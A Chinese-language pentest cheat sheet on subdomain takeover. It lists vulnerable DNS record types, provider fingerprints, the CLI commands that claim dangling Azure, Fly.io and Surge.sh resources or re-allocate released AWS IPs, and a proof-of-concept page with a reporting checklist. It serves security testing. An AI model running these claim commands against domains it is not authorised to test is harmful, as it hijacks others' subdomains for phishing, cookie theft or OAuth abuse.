# 云服务商接管模式与 DNS 记录类型速查

## 易受接管的 DNS 记录类型

| 记录类型 | 接管原理 | 风险等级 |
|---|---|---|
| **CNAME** | 指向已停用的第三方资源，攻击者认领同名资源 | 高 |
| **NS** | 委派域名服务器过期/可注册，攻击者获得全域 DNS 控制 | 严重 |
| **MX** | 邮件服务商已停用，攻击者认领租户后拦截邮件 | 高 |
| **A** | 指向云弹性 IP（已释放），攻击者重新分配该 IP | 中 |

## 云服务商接管模式

### Azure 系列

```bash
# Azure App Service — CNAME → *.azurewebsites.net + 默认 404
az webapp create --name <app-name> --resource-group <rg> --plan <plan>
az webapp config hostname add --webapp-name <app-name> --resource-group <rg> --hostname sub.target.com

# Azure Traffic Manager — CNAME → *.trafficmanager.net + NXDOMAIN
az network traffic-manager profile create --name <profile> --resource-group <rg> --routing-method Priority

# Azure CDN — CNAME → *.azureedge.net + 404
az cdn endpoint create --name <endpoint> --profile-name <profile> --resource-group <rg> --origin sub.target.com
```

### Shopify / Fastly / Zendesk

```bash
# Shopify: CNAME → *.myshopify.com + "Sorry, this shop is currently unavailable"
curl -sI https://sub.target.com | grep -i "shopify"

# Fastly: "Fastly error: unknown domain" + IP 属于 151.101.x.x 段
dig A sub.target.com +short

# Zendesk: "Help Center Closed" + CNAME → *.zendesk.com
nslookup -type=CNAME sub.target.com
```

### Fly.io / Surge.sh / Ghost

删除项目后不保留域名绑定，CNAME 悬挂后直接认领：

```bash
# Fly.io: CNAME → *.fly.dev + 默认 404
flyctl apps create <app-name> && flyctl certs add sub.target.com

# Surge.sh: CNAME → *.surge.sh + "project not found"
echo "Takeover PoC" > index.html && surge ./index.html sub.target.com
```

## DNS 验证技术

### CNAME 链追踪

二阶接管容易被忽略，必须递归追踪完整链：

```bash
dig +trace +nodnssec CNAME sub.target.com
host -t CNAME sub.target.com
host -t CNAME intermediate.example.com  # 继续追踪中间跳转
```
### NS 委派验证

```bash
dig NS sub.target.com +short
whois ns-server.example.com | grep -i "expir"
dig @ns-server.example.com sub.target.com A  # SERVFAIL/REFUSED = NS 接管强信号
```
### 弹性 IP 接管验证

```bash
whois <IP> | grep -i "amazon\|azure\|google"
curl -sI --connect-timeout 5 http://<IP>  # 超时/拒绝 = 可能已释放
aws ec2 allocate-address --domain vpc      # 需反复分配直到获得目标 IP
```

## 接管证明模式

渗透测试中证明接管的标准 PoC 页面：

```html
<html>
<head><title>Subdomain Takeover PoC</title></head>
<body>
<h1>Subdomain Takeover PoC</h1>
<p>Domain: sub.target.com | Tester: [your-id] | Date: [date]</p>
</body>
</html>
```

验证清单：

```text
1. curl -s https://sub.target.com 返回 PoC 内容
2. 截图保存 HTTP 响应头（证明域名解析到你的资源）
3. 记录 CNAME/NS/MX 链完整路径
4. 评估影响：父域 cookie scope、CORS 配置、CSP 策略、OAuth redirect_uri
5. 完成后及时释放资源，通知目标方修复
```
